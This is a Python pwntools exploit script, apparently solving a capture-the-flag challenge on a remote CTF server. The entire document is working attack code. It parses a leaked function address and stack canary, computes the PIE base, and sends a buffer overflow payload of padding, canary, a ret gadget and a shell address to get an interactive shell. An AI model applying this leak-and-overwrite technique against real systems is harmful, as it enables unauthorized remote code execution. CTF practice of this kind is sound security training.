from pwn import *
import re

elf = ELF('./pies_canaries_and_shells')
p   = remote('chals.f.cyberthon25.ctf.sg', 30111)

def clean_data(data):
    return re.sub(r'\x1b\[[0-9;]*m','', data).strip()

# 1) Press Enter
p.recvuntil("Press Enter to examine the papers...")
p.sendline()

# 2) Leak print_title
p.recvuntil("Written in an elegant script:\n")
line = clean_data(p.recvline().decode())
leaked_print_title = int(re.search(r'0x[0-9a-fA-F]+', line).group(),16)

# 3) Leak canary
p.recvuntil("sequence of characters:\n")
line = clean_data(p.recvline().decode())
leaked_canary = int(re.search(r'0x[0-9a-fA-F]+', line).group(),16)

# 4) Compute PIE base and shell addr
pie_base    = leaked_print_title - elf.symbols['print_title']
shell_addr  = pie_base + elf.symbols['shell']
log.info(f"pie_base   = {hex(pie_base)}")
log.info(f"leaked_canary = {hex(leaked_canary)}")
log.info(f"shell_addr = {hex(shell_addr)}")

# 5) Move on
p.sendline()

# 6) Build payload
p.recvuntil("Write your notes: ")
padding    = b"A"*72
canary     = p64(leaked_canary)
rbp        = p64(0x0)
ret_gadget = p64(pie_base + 0x101a)
shell_call = p64(shell_addr)

payload = padding + canary + rbp + ret_gadget + shell_call

# 7) Send and get shell
p.sendline(payload)
p.sendline()
p.interactive()
